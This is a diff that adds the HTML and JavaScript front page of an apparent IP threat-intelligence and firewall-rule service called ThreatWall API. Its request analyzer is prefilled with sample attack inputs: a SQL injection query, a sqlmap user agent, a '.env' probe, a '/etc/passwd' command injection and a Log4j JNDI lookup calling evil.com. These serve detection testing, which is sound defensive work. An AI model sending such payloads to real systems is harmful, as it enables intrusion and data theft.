@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ThreatWall API — Inbound Attack IP Intelligence & WAF Auto-Blocker</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    body { font-family: 'Plus Jakarta Sans', sans-serif; }
+    code, pre, .mono { font-family: 'JetBrains Mono', monospace; }
+    .glow-cyan { box-shadow: 0 0 25px -5px rgba(6, 182, 212, 0.3); }
+    .glow-red { box-shadow: 0 0 25px -5px rgba(239, 68, 68, 0.4); }
+    .glow-green { box-shadow: 0 0 25px -5px rgba(16, 185, 129, 0.3); }
+  </style>
+</head>
+<body class="bg-slate-950 text-slate-100 min-h-screen antialiased selection:bg-cyan-500 selection:text-black">
+
+  <!-- Top Banner -->
+  <header class="border-b border-slate-800 bg-slate-900/60 backdrop-blur-md sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3.5 flex items-center justify-between">
+      <div class="flex items-center space-x-3">
+        <div class="h-9 w-9 rounded-lg bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400 font-black text-lg">
+          🛡️
+        </div>
+        <div>
+          <div class="flex items-center space-x-2">
+            <span class="font-extrabold text-lg text-white tracking-tight">ThreatWall<span class="text-cyan-400">API</span></span>
+            <span class="text-xs px-2 py-0.5 rounded-full bg-cyan-950 text-cyan-300 border border-cyan-800 font-mono">v1.0.0</span>
+          </div>
+          <p class="text-xs text-slate-400">Real-Time Inbound Attack IP Intelligence & WAF Auto-Blocker</p>
+        </div>
+      </div>
+      <div class="flex items-center space-x-3">
+        <span class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-mono bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
+          <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse mr-1.5"></span> Engine Online
+        </span>
+        <a href="#docs" class="text-xs font-semibold px-3 py-1.5 rounded-md bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition">
+          API Specs
+        </a>
+      </div>
+    </div>
+  </header>
+
+  <!-- Hero Section -->
+  <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-10 space-y-10">
+    
+    <div class="text-center max-w-3xl mx-auto space-y-3">
+      <h1 class="text-3xl sm:text-4xl lg:text-5xl font-extrabold tracking-tight text-white">
+        Stop Inbound Attacks <br>
+        <span class="bg-gradient-to-r from-cyan-400 via-teal-300 to-indigo-400 bg-clip-text text-transparent">
+          Before They Touch Your Database
+        </span>
+      </h1>
+      <p class="text-slate-400 text-sm sm:text-base leading-relaxed">
+        Real-time threat assessment for IPv4/IPv6, botnet detection, Tor exit node discovery, and copy-paste multi-platform firewall generators (iptables, Nginx, Cloudflare, AWS WAF).
+      </p>
+    </div>
+
+    <!-- Live Interactive Threat Scanner Console -->
+    <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 sm:p-8 glow-cyan">
+      <div class="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-6 border-b border-slate-800">
+        <div>
+          <h2 class="text-lg font-bold text-white flex items-center space-x-2">
+            <span>⚡ Interactive IP Threat Assessment Console</span>
+          </h2>
+          <p class="text-xs text-slate-400 mt-1">Enter any IP address to generate live risk score, attack history, and instant firewall drop rules.</p>
+        </div>
+        
+        <!-- Preset quick buttons -->
+        <div class="flex flex-wrap gap-2 text-xs">
+          <button onclick="setSampleIp('185.220.101.5')" class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-red-300 border border-red-500/20 font-mono">
+            Tor Exit Node
+          </button>
+          <button onclick="setSampleIp('194.26.29.112')" class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-amber-300 border border-amber-500/20 font-mono">
+            Botnet C2 Node
+          </button>
+          <button onclick="setSampleIp('198.235.24.18')" class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-purple-300 border border-purple-500/20 font-mono">
+            Censys Scanner
+          </button>
+          <button onclick="setSampleIp('66.249.66.1')" class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-emerald-300 border border-emerald-500/20 font-mono">
+            Googlebot (Clean)
+          </button>
+        </div>
+      </div>
+
+      <!-- Search Input -->
+      <div class="mt-6 flex flex-col sm:flex-row gap-3">
+        <div class="relative flex-grow">
+          <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500 font-mono text-sm">
+            IP:
+          </span>
+          <input id="targetIpInput" type="text" value="185.220.101.5" placeholder="e.g. 185.220.101.5 or 45.146.164.110" 
+            class="w-full pl-12 pr-4 py-3 bg-slate-950 border border-slate-700 rounded-xl text-white font-mono text-sm focus:outline-none focus:border-cyan-400 transition">
+        </div>
+        <button onclick="runAssessment()" id="scanBtn" class="px-6 py-3 bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold rounded-xl transition flex items-center justify-center space-x-2 shadow-lg shadow-cyan-500/20">
+          <span>Assess Threat</span>
+          <span>⚡</span>
+        </button>
+      </div>
+
+      <!-- Results Display Panel -->
+      <div id="resultsCard" class="mt-6 grid grid-cols-1 lg:grid-cols-3 gap-6">
+        <!-- Metric & Action Card -->
+        <div class="bg-slate-950 border border-slate-800 rounded-xl p-5 space-y-4">
+          <div class="flex items-center justify-between">
+            <span class="text-xs uppercase tracking-wider text-slate-400 font-semibold">Threat Score</span>
+            <span id="riskBadge" class="text-xs px-2.5 py-0.5 rounded-full font-mono font-bold bg-red-950 text-red-400 border border-red-800">
+              CRITICAL
+            </span>
+          </div>
+
+          <div class="flex items-baseline space-x-3">
+            <span id="threatScoreDisplay" class="text-5xl font-black text-red-400 font-mono">95</span>
+            <span class="text-slate-500 text-sm">/ 100</span>
+          </div>
+
+          <div class="pt-3 border-t border-slate-800 space-y-2">
+            <div class="text-xs text-slate-400">Recommended Action:</div>
+            <div id="recommendedAction" class="font-mono text-sm font-bold text-red-400 bg-red-500/10 px-3 py-1.5 rounded-lg border border-red-500/20">
+              BLOCK & DROP
+            </div>
+          </div>
+
+          <div class="pt-2 space-y-1.5 text-xs text-slate-300">
+            <div class="flex justify-between">
+              <span class="text-slate-500">Classification:</span>
+              <span id="classificationDisplay" class="font-mono text-slate-200">TOR_EXIT_NODE</span>
+            </div>
+            <div class="flex justify-between">
+              <span class="text-slate-500">Origin Org:</span>
+              <span id="orgDisplay" class="font-mono text-slate-200 truncate max-w-[150px]">Tor Relay</span>
+            </div>
+            <div class="flex justify-between">
+              <span class="text-slate-500">Country:</span>
+              <span id="countryDisplay" class="font-mono text-slate-200">DE</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Details & Firewall Code Generation -->
+        <div class="lg:col-span-2 bg-slate-950 border border-slate-800 rounded-xl p-5 flex flex-col justify-between">
+          <div>
+            <div class="flex items-center justify-between border-b border-slate-800 pb-3 mb-3">
+              <div class="flex space-x-2 text-xs font-mono">
+                <button onclick="showCodeTab('nginx')" id="tab-nginx" class="px-2.5 py-1 rounded bg-cyan-950 text-cyan-300 border border-cyan-800">Nginx</button>
+                <button onclick="showCodeTab('iptables')" id="tab-iptables" class="px-2.5 py-1 rounded bg-slate-900 text-slate-400 hover:text-white">iptables</button>
+                <button onclick="showCodeTab('cloudflare')" id="tab-cloudflare" class="px-2.5 py-1 rounded bg-slate-900 text-slate-400 hover:text-white">Cloudflare WAF</button>
+                <button onclick="showCodeTab('json')" id="tab-json" class="px-2.5 py-1 rounded bg-slate-900 text-slate-400 hover:text-white">Full JSON</button>
+              </div>
+              <button onclick="copySnippet()" class="text-xs px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono flex items-center space-x-1">
+                <span>📋 Copy</span>
+              </button>
+            </div>
+
+            <!-- Code display area -->
+            <pre id="codeSnippet" class="p-3.5 bg-slate-900 rounded-lg text-xs font-mono text-cyan-300 overflow-x-auto border border-slate-800 max-h-48 leading-relaxed">deny 185.220.101.5;</pre>
+          </div>
+
+          <div id="summaryText" class="mt-4 text-xs text-slate-400 bg-slate-900/60 p-3 rounded-lg border border-slate-800/80">
+            CRITICAL THREAT. High-frequency Tor exit node. Automated firewall drop recommended.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Exploit & Malicious Request Inspector -->
+    <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6">
+      <div>
+        <h2 class="text-lg font-bold text-white flex items-center space-x-2">
+          <span>🔍 Malicious Request & Exploit Signature Analyzer</span>
+        </h2>
+        <p class="text-xs text-slate-400 mt-1">Test incoming request paths, headers, or SQLi/RCE payloads to evaluate exploit signatures.</p>
+      </div>
+
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div>
+          <label class="block text-xs font-semibold text-slate-400 mb-1">Target URI / Path:</label>
+          <input id="sampleUri" type="text" value="/api/v1/users?id=1 UNION SELECT password FROM admin--" 
+            class="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs font-mono text-white focus:outline-none focus:border-cyan-400">
+        </div>
+        <div>
+          <label class="block text-xs font-semibold text-slate-400 mb-1">User-Agent Header:</label>
+          <input id="sampleUserAgent" type="text" value="sqlmap/1.6#stable (https://sqlmap.org)" 
+            class="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs font-mono text-white focus:outline-none focus:border-cyan-400">
+        </div>
+      </div>
+
+      <div class="flex items-center justify-between">
+        <div class="flex gap-2 text-xs">
+          <button onclick="setSamplePayload('/.env', '')" class="text-xs px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono">/.env probe</button>
+          <button onclick="setSamplePayload('/cgi-bin/; cat /etc/passwd', '')" class="text-xs px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono">Path Traversal</button>
+          <button onclick="setSamplePayload('${jndi:ldap://evil.com/a}', '')" class="text-xs px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono">Log4j / RCE</button>
+        </div>
+        <button onclick="runPayloadAnalysis()" class="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 text-white font-bold rounded-lg text-xs transition">
+          Analyze Request
+        </button>
+      </div>
+
+      <div id="payloadResultBox" class="p-4 bg-slate-950 border border-slate-800 rounded-xl text-xs font-mono hidden space-y-2">
+        <!-- Filled dynamically -->
+      </div>
+    </div>
+
+    <!-- Top Live Attackers Feed & Cron Generator -->
+    <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6">
+      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+        <div>
+          <h2 class="text-lg font-bold text-white flex items-center space-x-2">
+            <span>📡 Continuous Cron Feed: Top Live Attackers</span>
+          </h2>
+          <p class="text-xs text-slate-400 mt-1">Sync your firewall automatically every 30-60 minutes using our live attacker droplists.</p>
+        </div>
+        <div class="flex items-center space-x-2 text-xs font-mono">
+          <span class="text-slate-400">Format:</span>
+          <select id="feedFormat" onchange="loadThreatFeed()" class="bg-slate-950 border border-slate-700 rounded px-2.5 py-1 text-slate-200">
+            <option value="json">JSON Feed</option>
+            <option value="plain_ip_list">Plain IP List (curl | xargs)</option>
+            <option value="nginx">Nginx Include Conf</option>
+            <option value="iptables">iptables Shell Script</option>
+          </select>
+        </div>
+      </div>
+
+      <!-- Terminal / Curl Helper -->
+      <div class="bg-slate-950 border border-slate-800 rounded-xl p-4 font-mono text-xs">
+        <div class="text-slate-500 mb-1"># Automated 30-Minute Cron Command:</div>
+        <div class="text-cyan-400 break-all select-all">
+          */30 * * * * curl -s https://threat-wall-api.vercel.app/v1/threats/top-attackers?format=plain_ip_list | while read ip; do iptables -C INPUT -s $ip -j DROP 2>/dev/null || iptables -A INPUT -s $ip -j DROP; done
+        </div>
+      </div>
+
+      <!-- Feed Table -->
+      <div class="overflow-x-auto border border-slate-800 rounded-xl">
+        <table class="w-full text-left text-xs font-mono">
+          <thead class="bg-slate-950 text-slate-400 border-b border-slate-800">
+            <tr>
+              <th class="p-3">Malicious IP</th>
+              <th class="p-3">Threat Category</th>
+              <th class="p-3">ASN / Org</th>
+              <th class="p-3">Country</th>
+              <th class="p-3">Abuse Score</th>
+              <th class="p-3">Action</th>
+            </tr>
+          </thead>
+          <tbody id="feedTableBody" class="divide-y divide-slate-800/60 bg-slate-950/40">
+            <!-- Filled dynamically -->
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- API Reference Section -->
+    <div id="docs" class="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6">
+      <h2 class="text-xl font-bold text-white">📖 Official API Endpoints (RapidAPI Ready)</h2>
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-mono">
+        <div class="p-4 bg-slate-950 rounded-xl border border-slate-800 space-y-2">
+          <div class="flex items-center justify-between">
+            <span class="px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400 border border-emerald-500/30">GET</span>
+            <span class="text-slate-400">/v1/ip/assess</span>
+          </div>
+          <p class="text-slate-400 font-sans">Single IP threat intelligence, risk scoring, Tor check, and network classification.</p>
+          <div class="text-cyan-400">curl "/v1/ip/assess?ip=185.220.101.5"</div>
+        </div>
+
+        <div class="p-4 bg-slate-950 rounded-xl border border-slate-800 space-y-2">
+          <div class="flex items-center justify-between">
+            <span class="px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400 border border-emerald-500/30">GET</span>
+            <span class="text-slate-400">/v1/firewall/rules</span>
+          </div>
+          <p class="text-slate-400 font-sans">Synthesize copy-paste rules for iptables, nftables, Nginx, Cloudflare, and AWS WAF.</p>
+          <div class="text-cyan-400">curl "/v1/firewall/rules?ip=185.220.101.5"</div>
+        </div>
+
+        <div class="p-4 bg-slate-950 rounded-xl border border-slate-800 space-y-2">
+          <div class="flex items-center justify-between">
+            <span class="px-2 py-0.5 rounded bg-blue-500/10 text-blue-400 border border-blue-500/30">POST</span>
+            <span class="text-slate-400">/v1/ip/bulk-assess</span>
+          </div>
+          <p class="text-slate-400 font-sans">Batch assess up to 100 IPs simultaneously from server logs.</p>
+          <div class="text-cyan-400">curl -X POST -d '{"ips":["1.1.1.1"]}' /v1/ip/bulk-assess</div>
+        </div>
+
+        <div class="p-4 bg-slate-950 rounded-xl border border-slate-800 space-y-2">
+          <div class="flex items-center justify-between">
+            <span class="px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400 border border-emerald-500/30">GET</span>
+            <span class="text-slate-400">/v1/threats/top-attackers</span>
+          </div>
+          <p class="text-slate-400 font-sans">Dynamic malicious CIDRs & IPs feed for cron firewall synchronization.</p>
+          <div class="text-cyan-400">curl "/v1/threats/top-attackers?category=all"</div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer class="border-t border-slate-800 bg-slate-950 py-8 text-center text-xs text-slate-500 font-mono">
+    ThreatWall API — Built for High-Volume B2B Infrastructure Security & Automations
+  </footer>
+
+  <script>
+    let currentAssessment = null;
+    let activeTab = 'nginx';
+
+    async function runAssessment() {
+      const ip = document.getElementById('targetIpInput').value.trim();
+      if (!ip) return;
+
+      try {
+        const res = await fetch(`/v1/ip/assess?ip=${encodeURIComponent(ip)}`);
+        const data = await res.json();
+        currentAssessment = data;
+        renderAssessment(data);
+      } catch (e) {
+        console.error('Error fetching assessment:', e);
+      }
+    }
+
+    function renderAssessment(data) {
+      document.getElementById('threatScoreDisplay').textContent = data.threat_score;
+      document.getElementById('threatScoreDisplay').className = `text-5xl font-black font-mono ${data.threat_score >= 80 ? 'text-red-400' : (data.threat_score >= 50 ? 'text-amber-400' : 'text-emerald-400')}`;
+      
+      const badge = document.getElementById('riskBadge');
+      badge.textContent = data.risk_level;
+      badge.className = `text-xs px-2.5 py-0.5 rounded-full font-mono font-bold ${data.risk_level === 'CRITICAL' ? 'bg-red-950 text-red-400 border border-red-800' : (data.risk_level === 'HIGH' ? 'bg-amber-950 text-amber-400 border border-amber-800' : 'bg-emerald-950 text-emerald-400 border border-emerald-800')}`;
+
+      document.getElementById('recommendedAction').textContent = data.recommended_action;
+      document.getElementById('classificationDisplay').textContent = data.classification;
+      document.getElementById('orgDisplay').textContent = data.network ? data.network.org : 'Unknown';
+      document.getElementById('countryDisplay').textContent = data.network ? data.network.country : 'GLOBAL';
+      document.getElementById('summaryText').textContent = data.summary;
+
+      updateCodeSnippet();
+    }
+
+    function showCodeTab(tab) {
+      activeTab = tab;
+      ['nginx', 'iptables', 'cloudflare', 'json'].forEach(t => {
+        const btn = document.getElementById(`tab-${t}`);
+        if (t === tab) {
+          btn.className = 'px-2.5 py-1 rounded bg-cyan-950 text-cyan-300 border border-cyan-800';
+        } else {
+          btn.className = 'px-2.5 py-1 rounded bg-slate-900 text-slate-400 hover:text-white';
+        }
+      });
+      updateCodeSnippet();
+    }
+
+    function updateCodeSnippet() {
+      if (!currentAssessment) return;
+      const ip = currentAssessment.ip;
+      const snippetBox = document.getElementById('codeSnippet');
+
+      if (activeTab === 'nginx') {
+        snippetBox.textContent = `deny ${ip};`;
+      } else if (activeTab === 'iptables') {
+        snippetBox.textContent = `iptables -A INPUT -s ${ip} -j DROP`;
+      } else if (activeTab === 'cloudflare') {
+        snippetBox.textContent = `(ip.src eq ${ip})`;
+      } else if (activeTab === 'json') {
+        snippetBox.textContent = JSON.stringify(currentAssessment, null, 2);
+      }
+    }
+
+    function setSampleIp(ip) {
+      document.getElementById('targetIpInput').value = ip;
+      runAssessment();
+    }
+
+    function setSamplePayload(uri, ua) {
+      document.getElementById('sampleUri').value = uri;
+      document.getElementById('sampleUserAgent').value = ua;
+      runPayloadAnalysis();
+    }
+
+    async function runPayloadAnalysis() {
+      const uri = document.getElementById('sampleUri').value;
+      const userAgent = document.getElementById('sampleUserAgent').value;
+      const box = document.getElementById('payloadResultBox');
+
+      try {
+        const res = await fetch('/v1/analyze/request', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ uri, user_agent: userAgent })
+        });
+        const data = await res.json();
+        box.classList.remove('hidden');
+        box.innerHTML = `
+          <div class="flex items-center justify-between pb-2 border-b border-slate-800">
+            <span class="font-bold ${data.is_malicious ? 'text-red-400' : 'text-emerald-400'}">
+              ${data.is_malicious ? '⚠️ EXPLOIT SIGNATURE DETECTED' : '✅ BENIGN REQUEST'}
+            </span>
+            <span class="text-slate-400">Risk: ${data.risk_score}/100</span>
+          </div>
+          <div class="text-slate-300">Action: <span class="text-red-400 font-bold">${data.recommended_action}</span> (HTTP ${data.recommended_http_status})</div>
+          <div class="text-slate-400 text-xs">${data.suggested_mitigation}</div>
+        `;
+      } catch (e) {
+        console.error(e);
+      }
+    }
+
+    async function loadThreatFeed() {
+      try {
+        const res = await fetch('/v1/threats/top-attackers?limit=10&format=json');
+        const data = await res.json();
+        const tbody = document.getElementById('feedTableBody');
+        tbody.innerHTML = '';
+        data.threats.forEach(t => {
+          const tr = document.createElement('tr');
+          tr.className = 'hover:bg-slate-900/50 transition';
+          tr.innerHTML = `
+            <td class="p-3 text-cyan-300 font-bold">${t.ip}</td>
+            <td class="p-3 text-slate-300">${t.threat}</td>
+            <td class="p-3 text-slate-400">${t.asn}</td>
+            <td class="p-3 text-slate-400">${t.country}</td>
+            <td class="p-3 text-red-400 font-bold">${t.abuse_score}%</td>
+            <td class="p-3">
+              <button onclick="setSampleIp('${t.ip}')" class="px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs">
+                Inspect
+              </button>
+            </td>
+          `;
+          tbody.appendChild(tr);
+        });
+      } catch (e) {
+        console.error(e);
+      }
+    }
+
+    function copySnippet() {
+      const code = document.getElementById('codeSnippet').textContent;
+      navigator.clipboard.writeText(code);
+      alert('Firewall rule copied to clipboard!');
+    }
+
+    // Auto-run initial assessment on page load
+    runAssessment();
+    loadThreatFeed();
+  </script>
+</body>
+</html>
